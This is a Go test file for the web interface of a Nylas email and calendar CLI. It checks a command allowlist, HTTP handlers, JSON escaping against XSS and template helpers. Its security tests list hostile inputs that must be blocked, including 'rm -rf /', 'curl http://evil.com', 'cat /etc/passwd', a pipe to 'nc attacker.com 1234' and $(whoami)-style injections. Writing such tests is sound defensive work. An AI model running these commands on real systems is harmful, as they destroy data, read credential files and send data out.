package ui

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/mqasimca/nylas/internal/domain"
)

// =============================================================================
// Command Validation Tests
// =============================================================================

func TestAllowedCommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		allowed bool
	}{
		// Auth commands
		{"auth login", "auth login", true},
		{"auth logout", "auth logout", true},
		{"auth status", "auth status", true},
		{"auth whoami", "auth whoami", true},
		{"auth list", "auth list", true},
		{"auth show", "auth show", true},
		{"auth switch", "auth switch", true},
		{"auth config", "auth config", true},
		{"auth providers", "auth providers", true},

		// Email commands
		{"email list", "email list", true},
		{"email read", "email read", true},
		{"email send", "email send", true},
		{"email search", "email search", true},
		{"email delete", "email delete", true},
		{"email folders list", "email folders list", true},
		{"email threads list", "email threads list", true},
		{"email drafts create", "email drafts create", true},

		// Calendar commands
		{"calendar list", "calendar list", true},
		{"calendar events list", "calendar events list", true},
		{"calendar events show", "calendar events show", true},
		{"calendar availability check", "calendar availability check", true},

		// Contacts commands
		{"contacts list", "contacts list", true},
		{"contacts list --id", "contacts list --id", true},
		{"contacts show", "contacts show", true},
		{"contacts create", "contacts create", true},
		{"contacts search", "contacts search", true},
		{"contacts groups", "contacts groups", true},

		// Inbound commands
		{"inbound list", "inbound list", true},
		{"inbound show", "inbound show", true},
		{"inbound create", "inbound create", true},
		{"inbound messages", "inbound messages", true},
		{"inbound monitor", "inbound monitor", true},

		// Scheduler commands
		{"scheduler configurations", "scheduler configurations", true},
		{"scheduler sessions", "scheduler sessions", true},
		{"scheduler bookings", "scheduler bookings", true},
		{"scheduler pages", "scheduler pages", true},

		// Timezone commands
		{"timezone list", "timezone list", true},
		{"timezone info", "timezone info", true},
		{"timezone convert", "timezone convert", true},
		{"timezone find-meeting", "timezone find-meeting", true},
		{"timezone dst", "timezone dst", true},

		// Webhook commands
		{"webhook list", "webhook list", true},
		{"webhook show", "webhook show", true},
		{"webhook create", "webhook create", true},
		{"webhook update", "webhook update", true},
		{"webhook delete", "webhook delete", true},
		{"webhook triggers", "webhook triggers", true},
		{"webhook test", "webhook test", true},
		{"webhook server", "webhook server", true},

		// OTP commands
		{"otp get", "otp get", true},
		{"otp watch", "otp watch", true},
		{"otp list", "otp list", true},
		{"otp messages", "otp messages", true},

		// Admin commands
		{"admin applications", "admin applications", true},
		{"admin connectors", "admin connectors", true},
		{"admin credentials", "admin credentials", true},
		{"admin grants", "admin grants", true},

		// Notetaker commands
		{"notetaker list", "notetaker list", true},
		{"notetaker show", "notetaker show", true},
		{"notetaker create", "notetaker create", true},
		{"notetaker delete", "notetaker delete", true},
		{"notetaker media", "notetaker media", true},

		// Version
		{"version", "version", true},

		// Blocked commands
		{"rm command", "rm -rf /", false},
		{"shell injection", "email list; rm -rf /", false},
		{"unknown command", "unknown command", false},
		{"empty command", "", false},
		{"sudo", "sudo anything", false},
		{"curl", "curl http://evil.com", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isCommandAllowed(tt.command)
			if result != tt.allowed {
				t.Errorf("isCommandAllowed(%q) = %v, want %v", tt.command, result, tt.allowed)
			}
		})
	}
}

// isCommandAllowed checks if a command is in the allowlist.
// This is extracted for testing purposes.
func isCommandAllowed(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}

	// Check for shell metacharacters (defense in depth)
	if containsDangerousChars(cmd) {
		return false
	}

	args := strings.Fields(cmd)
	if len(args) == 0 {
		return false
	}

	// Try 3-word command first
	if len(args) >= 3 {
		baseCmd := args[0] + " " + args[1] + " " + args[2]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	// Try 2-word command
	if len(args) >= 2 {
		baseCmd := args[0] + " " + args[1]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	// Try 1-word command
	if len(args) >= 1 {
		baseCmd := args[0]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	return false
}

// =============================================================================
// HTTP Handler Tests
// =============================================================================

func TestHandleExecCommand_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test GET method (should fail)
	req := httptest.NewRequest(http.MethodGet, "/api/exec", nil)
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleExecCommand_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/exec", strings.NewReader("invalid json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message in response")
	}
}

func TestHandleExecCommand_BlockedCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	blockedCommands := []string{
		"rm -rf /",
		"sudo anything",
		"curl http://evil.com",
		"wget http://evil.com",
		"cat /etc/passwd",
		"unknown command",
		"; rm -rf /",
		"email list | curl http://evil.com",
	}

	for _, cmd := range blockedCommands {
		t.Run(cmd, func(t *testing.T) {
			body, _ := json.Marshal(ExecRequest{Command: cmd})
			req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			server.handleExecCommand(w, req)

			if w.Code != http.StatusForbidden {
				t.Errorf("Command %q: expected status %d, got %d", cmd, http.StatusForbidden, w.Code)
			}

			var resp ExecResponse
			if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
				t.Fatalf("Failed to decode response: %v", err)
			}

			if !strings.Contains(resp.Error, "not allowed") {
				t.Errorf("Expected 'not allowed' error, got: %s", resp.Error)
			}
		})
	}
}

func TestHandleConfigStatus_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/status", nil)
	w := httptest.NewRecorder()

	server.handleConfigStatus(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleListGrants_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants", nil)
	w := httptest.NewRecorder()

	server.handleListGrants(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/grants/default", nil)
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleSetDefaultGrant_EmptyGrantID(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetDefaultGrantRequest{GrantID: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetDefaultGrantResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "required") {
		t.Errorf("Expected 'required' error, got: %s", resp.Error)
	}
}

func TestHandleConfigSetup_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/config/setup", nil)
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleConfigSetup_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleConfigSetup_EmptyAPIKey(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetupRequest{APIKey: "", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "API key") {
		t.Errorf("Expected API key error, got: %s", resp.Error)
	}
}

func TestHandleIndex_NotFoundForNonRoot(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/nonexistent", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status %d, got %d", http.StatusNotFound, w.Code)
	}
}

// =============================================================================
// WriteJSON Helper Tests
// =============================================================================

func TestWriteJSON(t *testing.T) {
	t.Parallel()

	w := httptest.NewRecorder()

	data := map[string]string{"key": "value"}
	writeJSON(w, http.StatusOK, data)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if contentType != "application/json" {
		t.Errorf("Expected Content-Type application/json, got %s", contentType)
	}

	var result map[string]string
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if result["key"] != "value" {
		t.Errorf("Expected key=value, got key=%s", result["key"])
	}
}

// =============================================================================
// Command Whitelist Completeness Tests
// =============================================================================

func TestAllowedCommandsCompleteness(t *testing.T) {
	t.Parallel()

	// Verify all expected command categories are present
	expectedPrefixes := []string{
		"auth",
		"email",
		"calendar",
		"contacts",
		"inbound",
		"scheduler",
		"timezone",
		"webhook",
		"otp",
		"admin",
		"notetaker",
		"version",
	}

	for _, prefix := range expectedPrefixes {
		found := false
		for cmd := range allowedCommands {
			if strings.HasPrefix(cmd, prefix) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("No commands found with prefix %q", prefix)
		}
	}
}

func TestAllowedCommands_NoShellCharacters(t *testing.T) {
	t.Parallel()

	// Verify no allowed commands contain shell metacharacters
	dangerousChars := []string{";", "|", "&", "`", "$", "(", ")", "<", ">", "\\"}

	for cmd := range allowedCommands {
		for _, char := range dangerousChars {
			if strings.Contains(cmd, char) {
				t.Errorf("Allowed command %q contains dangerous character %q", cmd, char)
			}
		}
	}
}

// =============================================================================
// Request/Response Type Tests
// =============================================================================

func TestExecRequestJSON(t *testing.T) {
	t.Parallel()

	req := ExecRequest{Command: "email list"}
	data, err := json.Marshal(req)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecRequest
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Command != req.Command {
		t.Errorf("Expected command %q, got %q", req.Command, decoded.Command)
	}
}

func TestExecResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ExecResponse{Output: "test output", Error: ""}
	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Output != resp.Output {
		t.Errorf("Expected output %q, got %q", resp.Output, decoded.Output)
	}
}

func TestConfigStatusResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ConfigStatusResponse{
		Configured:   true,
		Region:       "us",
		ClientID:     "test-client",
		HasAPIKey:    true,
		GrantCount:   2,
		DefaultGrant: "grant-123",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ConfigStatusResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Configured != resp.Configured {
		t.Errorf("Expected Configured %v, got %v", resp.Configured, decoded.Configured)
	}
	if decoded.GrantCount != resp.GrantCount {
		t.Errorf("Expected GrantCount %d, got %d", resp.GrantCount, decoded.GrantCount)
	}
}

// =============================================================================
// Security Tests
// =============================================================================

func TestCommandInjectionPrevention(t *testing.T) {
	t.Parallel()

	injectionAttempts := []string{
		"email list; rm -rf /",
		"email list && cat /etc/passwd",
		"email list | nc attacker.com 1234",
		"email list `whoami`",
		"email list $(whoami)",
		"email list\nrm -rf /",
		"email list\x00rm -rf /",
		"../../../etc/passwd",
		"email list --flag=$(cat /etc/passwd)",
	}

	for _, attempt := range injectionAttempts {
		t.Run(attempt[:min(20, len(attempt))], func(t *testing.T) {
			if isCommandAllowed(attempt) {
				t.Errorf("Injection attempt should be blocked: %q", attempt)
			}
		})
	}
}

func TestCommandWithFlagsAllowed(t *testing.T) {
	t.Parallel()

	// Commands with legitimate flags should be allowed
	legitimateCommands := []string{
		"email list --limit 10",
		"email list --unread --starred",
		"auth login --provider google",
		"calendar events list --days 7",
		"email folders list --id",
	}

	for _, cmd := range legitimateCommands {
		t.Run(cmd, func(t *testing.T) {
			if !isCommandAllowed(cmd) {
				t.Errorf("Legitimate command should be allowed: %q", cmd)
			}
		})
	}
}

// =============================================================================
// XSS Prevention Tests
// =============================================================================

func TestSafeJSJSON_EscapesDangerousSequences(t *testing.T) {
	t.Parallel()

	// Go's json.Marshal escapes <, >, & as unicode escape sequences
	// This prevents XSS when embedding JSON in HTML script tags
	tests := []struct {
		name     string
		input    any
		contains string // What the escaped output should contain
		excludes string // What should NOT appear unescaped
	}{
		{
			name:     "escapes script close tag",
			input:    map[string]string{"content": "</script>"},
			contains: `\u003c/script\u003e`, // < and > escaped
			excludes: "</script>",
		},
		{
			name:     "escapes HTML comment start",
			input:    map[string]string{"content": "<!--"},
			contains: `\u003c!--`, // < escaped
			excludes: "<!--",
		},
		{
			name:     "escapes greater than",
			input:    map[string]string{"content": "-->"},
			contains: `--\u003e`, // > escaped
			excludes: "-->",
		},
		{
			name:     "escapes ampersand",
			input:    map[string]string{"content": "&amp;"},
			contains: `\u0026amp;`, // & escaped
			excludes: "&amp;",
		},
		{
			name:     "normal content unchanged",
			input:    map[string]string{"key": "value"},
			contains: `"key":"value"`,
			excludes: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := string(safeJSJSON(tt.input))

			if tt.contains != "" && !strings.Contains(result, tt.contains) {
				t.Errorf("Expected result to contain %q, got: %s", tt.contains, result)
			}

			if tt.excludes != "" && strings.Contains(result, tt.excludes) {
				t.Errorf("Expected result to NOT contain %q, got: %s", tt.excludes, result)
			}
		})
	}
}

func TestSafeJSJSON_HandlesNil(t *testing.T) {
	t.Parallel()

	result := string(safeJSJSON(nil))
	if result != "null" {
		t.Errorf("Expected 'null', got: %s", result)
	}
}

func TestSafeJSJSON_HandlesPageData(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{
			{ID: "test-id", Email: "test@example.com", Provider: "google"},
		},
	}

	result := string(data.GrantsJSON())

	if !strings.Contains(result, "test@example.com") {
		t.Errorf("Expected result to contain email, got: %s", result)
	}

	// Ensure dangerous characters are escaped (< becomes \u003c)
	if strings.Contains(result, "<") || strings.Contains(result, ">") {
		t.Errorf("Result should not contain unescaped < or >: %s", result)
	}
}

func TestSafeJSJSON_HandlesError(t *testing.T) {
	t.Parallel()

	// Create an unmarshalable value (channel)
	ch := make(chan int)
	result := string(safeJSJSON(ch))

	if result != "null" {
		t.Errorf("Expected 'null' for unmarshalable value, got: %s", result)
	}
}

// =============================================================================
// Template Loading Tests
// =============================================================================

func TestLoadTemplates(t *testing.T) {
	t.Parallel()

	tmpl, err := loadTemplates()
	if err != nil {
		t.Fatalf("loadTemplates() failed: %v", err)
	}

	if tmpl == nil {
		t.Fatal("loadTemplates() returned nil template")
	}

	// Verify templates are loaded (ParseFS uses base filename as name)
	templates := tmpl.Templates()
	if len(templates) == 0 {
		t.Error("No templates loaded")
	}

	// Log loaded template names for debugging
	var names []string
	for _, tpl := range templates {
		if tpl.Name() != "" {
			names = append(names, tpl.Name())
		}
	}

	// Verify we have some templates
	if len(names) < 3 {
		t.Errorf("Expected at least 3 templates, got %d: %v", len(names), names)
	}
}

func TestLoadTemplates_FunctionsAvailable(t *testing.T) {
	t.Parallel()

	tmpl, err := loadTemplates()
	if err != nil {
		t.Fatalf("loadTemplates() failed: %v", err)
	}

	// Test that template functions work by executing a simple template
	testTmpl, err := tmpl.New("test").Parse(`{{ upper "hello" }}`)
	if err != nil {
		t.Fatalf("Failed to parse test template: %v", err)
	}

	var buf bytes.Buffer
	if err := testTmpl.Execute(&buf, nil); err != nil {
		t.Fatalf("Failed to execute template: %v", err)
	}

	if buf.String() != "HELLO" {
		t.Errorf("Expected 'HELLO', got %q", buf.String())
	}
}

// =============================================================================
// Template Function Tests
// =============================================================================

func TestTemplateFuncs_Upper(t *testing.T) {
	t.Parallel()

	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "HELLO"},
		{"HELLO", "HELLO"},
		{"Hello World", "HELLO WORLD"},
		{"", ""},
		{"123abc", "123ABC"},
	}

	upperFn := templateFuncs["upper"].(func(string) string)

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := upperFn(tt.input)
			if result != tt.expected {
				t.Errorf("upper(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestTemplateFuncs_Lower(t *testing.T) {
	t.Parallel()

	tests := []struct {
		input    string
		expected string
	}{
		{"HELLO", "hello"},
		{"hello", "hello"},
		{"Hello World", "hello world"},
		{"", ""},
		{"123ABC", "123abc"},
	}

	lowerFn := templateFuncs["lower"].(func(string) string)

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := lowerFn(tt.input)
			if result != tt.expected {
				t.Errorf("lower(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestTemplateFuncs_Slice(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		input    string
		start    int
		end      int
		expected string
	}{
		{"normal slice", "hello", 0, 3, "hel"},
		{"full string", "hello", 0, 5, "hello"},
		{"middle slice", "hello", 1, 4, "ell"},
		{"empty result", "hello", 2, 2, ""},
		{"start beyond length", "hello", 10, 15, ""},
		{"end beyond length", "hello", 0, 100, "hello"},
		{"empty string", "", 0, 0, ""},
		{"unicode string bytes", "héllo", 0, 3, "hé"}, // slice works on bytes, not runes (é = 2 bytes)
		{"single char", "a", 0, 1, "a"},
	}

	sliceFn := templateFuncs["slice"].(func(string, int, int) string)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sliceFn(tt.input, tt.start, tt.end)
			if result != tt.expected {
				t.Errorf("slice(%q, %d, %d) = %q, want %q",
					tt.input, tt.start, tt.end, result, tt.expected)
			}
		})
	}
}

// =============================================================================
// Response Body Validation Tests
// =============================================================================

func TestHandleExecCommand_ResponseStructure(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test blocked command response structure
	body, _ := json.Marshal(ExecRequest{Command: "rm -rf /"})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	// Verify response has expected fields
	if resp.Error == "" {
		t.Error("Expected non-empty error field for blocked command")
	}
	if resp.Output != "" {
		t.Errorf("Expected empty output for blocked command, got: %s", resp.Output)
	}
}

func TestHandleExecCommand_EmptyCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(ExecRequest{Command: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected status %d for empty command, got %d", http.StatusForbidden, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message for empty command")
	}
}

func TestHandleExecCommand_WhitespaceOnlyCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(ExecRequest{Command: "   \t\n  "})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected status %d for whitespace command, got %d", http.StatusForbidden, w.Code)
	}
}

func TestConfigStatusResponse_JSONStructure(t *testing.T) {
	t.Parallel()

	// Test the response structure directly (handler requires configService)
	resp := ConfigStatusResponse{
		Configured:   true,
		ClientID:     "client-123",
		Region:       "us",
		HasAPIKey:    true,
		GrantCount:   2,
		DefaultGrant: "grant-abc",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ConfigStatusResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Configured != true {
		t.Error("Expected Configured to be true")
	}
	if decoded.GrantCount != 2 {
		t.Errorf("Expected GrantCount 2, got %d", decoded.GrantCount)
	}
	if decoded.Region != "us" {
		t.Errorf("Expected Region 'us', got %q", decoded.Region)
	}
}

func TestConfigStatusResponse_Unconfigured(t *testing.T) {
	t.Parallel()

	resp := ConfigStatusResponse{
		Configured: false,
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	// Verify JSON has expected structure
	if !strings.Contains(string(data), `"configured":false`) {
		t.Errorf("Expected configured:false, got: %s", string(data))
	}
}

func TestGrantsResponse_JSONStructure(t *testing.T) {
	t.Parallel()

	// Test the response structure directly (handler requires grantStore)
	resp := GrantsResponse{
		Grants:       []Grant{{ID: "test", Email: "test@example.com", Provider: "google"}},
		DefaultGrant: "test",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded GrantsResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if len(decoded.Grants) != 1 {
		t.Errorf("Expected 1 grant, got %d", len(decoded.Grants))
	}
	if decoded.DefaultGrant != "test" {
		t.Errorf("Expected default_grant 'test', got %q", decoded.DefaultGrant)
	}
}

func TestGrantsResponse_EmptyGrants(t *testing.T) {
	t.Parallel()

	resp := GrantsResponse{
		Grants:       []Grant{},
		DefaultGrant: "",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	// Verify it produces valid empty array JSON
	if !strings.Contains(string(data), `"grants":[]`) {
		t.Errorf("Expected empty grants array, got: %s", string(data))
	}
}

// =============================================================================
// GetDefaultCommands Tests
// =============================================================================

func TestGetDefaultCommands(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Verify all categories have commands
	if len(cmds.Auth) == 0 {
		t.Error("Auth commands should not be empty")
	}
	if len(cmds.Email) == 0 {
		t.Error("Email commands should not be empty")
	}
	if len(cmds.Calendar) == 0 {
		t.Error("Calendar commands should not be empty")
	}
	if len(cmds.Contacts) == 0 {
		t.Error("Contacts commands should not be empty")
	}
	if len(cmds.Inbound) == 0 {
		t.Error("Inbound commands should not be empty")
	}
	if len(cmds.Scheduler) == 0 {
		t.Error("Scheduler commands should not be empty")
	}
	if len(cmds.Timezone) == 0 {
		t.Error("Timezone commands should not be empty")
	}
	if len(cmds.Webhook) == 0 {
		t.Error("Webhook commands should not be empty")
	}
	if len(cmds.OTP) == 0 {
		t.Error("OTP commands should not be empty")
	}
	if len(cmds.Admin) == 0 {
		t.Error("Admin commands should not be empty")
	}
	if len(cmds.Notetaker) == 0 {
		t.Error("Notetaker commands should not be empty")
	}
}

func TestGetDefaultCommands_RequiredFields(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Check all commands have required fields
	allCommands := []Command{}
	allCommands = append(allCommands, cmds.Auth...)
	allCommands = append(allCommands, cmds.Email...)
	allCommands = append(allCommands, cmds.Calendar...)
	allCommands = append(allCommands, cmds.Contacts...)
	allCommands = append(allCommands, cmds.Inbound...)
	allCommands = append(allCommands, cmds.Scheduler...)
	allCommands = append(allCommands, cmds.Timezone...)
	allCommands = append(allCommands, cmds.Webhook...)
	allCommands = append(allCommands, cmds.OTP...)
	allCommands = append(allCommands, cmds.Admin...)
	allCommands = append(allCommands, cmds.Notetaker...)

	for _, cmd := range allCommands {
		if cmd.Key == "" {
			t.Errorf("Command has empty Key: %+v", cmd)
		}
		if cmd.Title == "" {
			t.Errorf("Command %q has empty Title", cmd.Key)
		}
		if cmd.Cmd == "" {
			t.Errorf("Command %q has empty Cmd", cmd.Key)
		}
		if cmd.Desc == "" {
			t.Errorf("Command %q has empty Desc", cmd.Key)
		}
	}
}

func TestGetDefaultCommands_ParamCommands(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Find commands that require parameters
	allCommands := []Command{}
	allCommands = append(allCommands, cmds.Auth...)
	allCommands = append(allCommands, cmds.Email...)
	allCommands = append(allCommands, cmds.Calendar...)
	allCommands = append(allCommands, cmds.Contacts...)
	allCommands = append(allCommands, cmds.Inbound...)
	allCommands = append(allCommands, cmds.Scheduler...)
	allCommands = append(allCommands, cmds.Timezone...)
	allCommands = append(allCommands, cmds.Webhook...)
	allCommands = append(allCommands, cmds.OTP...)
	allCommands = append(allCommands, cmds.Admin...)
	allCommands = append(allCommands, cmds.Notetaker...)

	paramCommands := 0
	for _, cmd := range allCommands {
		if cmd.ParamName != "" {
			paramCommands++
			if cmd.Placeholder == "" {
				t.Errorf("Command %q has ParamName but no Placeholder", cmd.Key)
			}
		}
	}

	// Verify we have some commands that take parameters
	if paramCommands == 0 {
		t.Error("Expected some commands to have parameters (read, show, search)")
	}
}

// =============================================================================
// PageData JSON Methods Tests
// =============================================================================

func TestPageData_GrantsJSON_Empty(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{},
	}

	result := string(data.GrantsJSON())
	if result != "[]" {
		t.Errorf("Expected '[]' for empty grants, got: %s", result)
	}
}

func TestPageData_GrantsJSON_WithData(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{
			{ID: "id-1", Email: "user1@example.com", Provider: "google"},
			{ID: "id-2", Email: "user2@example.com", Provider: "microsoft"},
		},
	}

	result := string(data.GrantsJSON())

	// Verify it's valid JSON
	var grants []Grant
	if err := json.Unmarshal([]byte(result), &grants); err != nil {
		t.Fatalf("Failed to unmarshal GrantsJSON result: %v", err)
	}

	if len(grants) != 2 {
		t.Errorf("Expected 2 grants, got %d", len(grants))
	}
}

func TestPageData_CommandsJSON(t *testing.T) {
	t.Parallel()

	data := PageData{
		Commands: GetDefaultCommands(),
	}

	result := string(data.CommandsJSON())

	// Verify it's valid JSON
	var cmds Commands
	if err := json.Unmarshal([]byte(result), &cmds); err != nil {
		t.Fatalf("Failed to unmarshal CommandsJSON result: %v", err)
	}

	if len(cmds.Auth) == 0 {
		t.Error("Expected auth commands in JSON")
	}
}

// =============================================================================
// getDemoCommandOutput Tests
// =============================================================================

func TestGetDemoCommandOutput_AllCommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		command  string
		contains []string
	}{
		// Email commands
		{"email list", []string{"Demo Mode", "alice@example.com", "Showing"}},
		{"email threads", []string{"Demo Mode", "Standup", "threads"}},

		// Calendar commands
		{"calendar list", []string{"Demo Mode", "Work Calendar", "PRIMARY"}},
		{"calendar events", []string{"Demo Mode", "Team Standup", "upcoming events"}},

		// Auth commands
		{"auth status", []string{"Demo Mode", "Configured", "alice@example.com"}},
		{"auth list", []string{"Demo Mode", "Connected Accounts", "demo-grant"}},

		// Contacts commands
		{"contacts list", []string{"Demo Mode", "Alice Johnson", "contact"}},
		{"contacts list --id", []string{"Demo Mode", "demo-contact-001"}},
		{"contacts groups", []string{"Demo Mode", "Contact Groups", "Work"}},

		// Inbound commands
		{"inbound list", []string{"Demo Mode", "Inbound Inboxes", "inbox-001"}},
		{"inbound messages", []string{"Demo Mode", "Inbound Messages", "billing"}},

		// Scheduler commands
		{"scheduler configurations", []string{"Demo Mode", "30-min Meeting", "DURATION"}},
